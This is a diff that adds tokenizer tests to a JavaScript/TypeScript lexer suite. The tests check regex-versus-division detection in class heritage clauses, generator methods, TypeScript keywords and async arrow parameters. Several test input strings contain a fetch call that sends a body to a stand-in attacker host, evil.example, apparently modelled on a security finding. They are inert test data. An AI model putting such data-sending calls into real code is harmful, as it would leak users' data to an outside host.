@@ -441,6 +441,116 @@ describe("js-tokens: of, keyof, yield and await are operators only where the syn
   });
 });
 
+describe("js-tokens: a class's head goes on through its heritage to its body", () => {
+  test("a call in the heritage: the body is a class body, its methods read yield and await", () => {
+    assert.deepEqual(regexes("class A extends f(B) { *g() { yield /re/; } }"), ["/re/"]);
+    assert.deepEqual(regexes("class A extends f(B) { async m() { await /re/; } }"), ["/re/"]);
+    assert.deepEqual(regexes("class A extends f(B){*g(){yield/'/.test(a)?1:2}}"), ["/'/"]);
+    assert.deepEqual(regexes("class A extends f(B){async m(){if(await/'/.test(a))return 1}}"), [
+      "/'/",
+    ]);
+    assert.deepEqual(regexes("x = class extends f(B) { *g() { yield /re/; } };"), ["/re/"]);
+    assert.deepEqual(regexes("class A extends (B) { *g() { yield /re/; } }"), ["/re/"]);
+    assert.deepEqual(regexes("class A extends f(g(B), h)\n{ *g() { yield /re/; } }"), ["/re/"]);
+    assert.deepEqual(regexes("class A extends new F(B)() { *g() { yield /re/; } }"), ["/re/"]);
+    assert.deepEqual(regexes("class A extends f`x`(B) { *g() { yield /re/; } }"), ["/re/"]);
+    assert.deepEqual(regexes("class A<T> extends f(B)<T> { *g() { yield /re/; } }", "x.ts"), [
+      "/re/",
+    ]);
+    // Its body closes a class: a declaration's starts a statement, an expression's ends one.
+    assert.deepEqual(regexes("class A extends f(B) {}\n/re/.test(s);"), ["/re/"]);
+    assert.deepEqual(regexes("x = class extends f(B) {} / 2 / 3;"), []);
+  });
+
+  test("the finding's class: a regular expression in a generator method, then a URL", () => {
+    assert.deepEqual(
+      literals(
+        "class Rows extends Base(Object){*cells(r){for(const s of r)yield /'/.test(s)?esc(s):s}send(u){return fetch('https://evil.example/x',{body:u})}strip(s){return s.replace(/'/g,'')\n}}",
+      ),
+      ["regex:/'/", "string:'https://evil.example/x'", "regex:/'/g", "string:''"],
+    );
+  });
+
+  test("a function, class or object in the heritage: the class's body is the next one", () => {
+    assert.deepEqual(
+      regexes("class A extends function () { return /a/; } { *g() { yield /re/; } }"),
+      ["/a/", "/re/"],
+    );
+    assert.deepEqual(
+      regexes("class A extends class { m() { return /a/; } } { *g() { yield /re/; } }"),
+      ["/a/", "/re/"],
+    );
+    assert.deepEqual(
+      regexes("class A extends class extends class {} {} { *g() { yield /re/; } }"),
+      ["/re/"],
+    );
+    assert.deepEqual(regexes("class A extends function () {}.call { *g() { yield /re/; } }"), [
+      "/re/",
+    ]);
+    assert.deepEqual(
+      regexes("class A extends async function () { await /a/; } { async m() { await /re/; } }"),
+      ["/a/", "/re/"],
+    );
+    assert.deepEqual(regexes("class A extends {}.constructor { *g() { yield /re/; } }"), ["/re/"]);
+    assert.deepEqual(regexes("class A extends new {}.constructor() { *g() { yield /re/; } }"), [
+      "/re/",
+    ]);
+    // An anonymous class's `extends` takes an operand, as a named one's does.
+    assert.deepEqual(regexes("x = class extends /re/.constructor { *g() { yield /b/; } };"), [
+      "/re/",
+      "/b/",
+    ]);
+    assert.deepEqual(regexes("x = class extends B { *g() { yield /re/; } } / 2 / 3;"), ["/re/"]);
+  });
+});
+
+describe("js-tokens: TypeScript's words where JavaScript has a name", () => {
+  test("type, interface, namespace and module before a reserved word are names in an expression", () => {
+    for (const file of ["x.js", "x.ts"]) {
+      assert.deepEqual(regexes("var type = 0; type in /'/ && 0;", file), ["/'/"], file);
+      assert.deepEqual(
+        literals("var type=0;type in /'/&&0;fetch('https://evil.example/x')", file),
+        ["regex:/'/", "string:'https://evil.example/x'"],
+        file,
+      );
+      assert.deepEqual(regexes("type instanceof /'/.constructor;", file), ["/'/"], file);
+      assert.deepEqual(regexes("interface in /'/ && 0;", file), ["/'/"], file);
+      assert.deepEqual(regexes("namespace in /'/ && 0;", file), ["/'/"], file);
+      assert.deepEqual(regexes("module instanceof /'/.constructor;", file), ["/'/"], file);
+    }
+    // Before a name that starts with a reserved word's letters, they still declare.
+    assert.deepEqual(regexes("type inner = { a: 1 }\n/re/.test(s);", "x.ts"), ["/re/"]);
+    assert.deepEqual(regexes("type iné = { a: 1 }\n/re/.test(s);", "x.ts"), ["/re/"]);
+    assert.deepEqual(regexes("interface instance { a: 1 }\n/re/.test(s);", "x.ts"), ["/re/"]);
+  });
+
+  test("an async arrow function's single parameter, whatever its name", () => {
+    for (const file of ["x.js", "x.ts"]) {
+      for (const param of ["as", "satisfies", "let", "yield", "e", `${BS}u0078`]) {
+        assert.deepEqual(
+          regexes(`const g = async ${param} => await /'/.test(x) ? 0 : 1;`, file),
+          ["/'/"],
+          `${file}: ${param}`,
+        );
+        assert.deepEqual(
+          regexes(`const g = async ${param} => { if (await /'/.test(x)) return 1; };`, file),
+          ["/'/"],
+          `${file}: ${param}`,
+        );
+      }
+    }
+    assert.deepEqual(
+      literals("const g=async as=>await /'/.test(as)?0:fetch('https://evil.example/x')"),
+      ["regex:/'/", "string:'https://evil.example/x'"],
+    );
+    // After a name, `as` and `satisfies` still start a type (TypeScript).
+    assert.deepEqual(regexes("const y = async as number / 2 / 1;", "x.ts"), []);
+    assert.deepEqual(regexes("const y = async satisfies T / 2 / 1;", "x.ts"), []);
+    // `async` and a line break before the parameter: no async arrow function.
+    assert.deepEqual(regexes("function f() { var g = async\nlet => await / 2 / 3; }"), []);
+  });
+});
+
 describe("js-tokens: a line break after a statement that cannot go on starts the next one", () => {
   for (const [what, src, file] of [
     ["a var binding with no initializer", "var x", "x.js"],
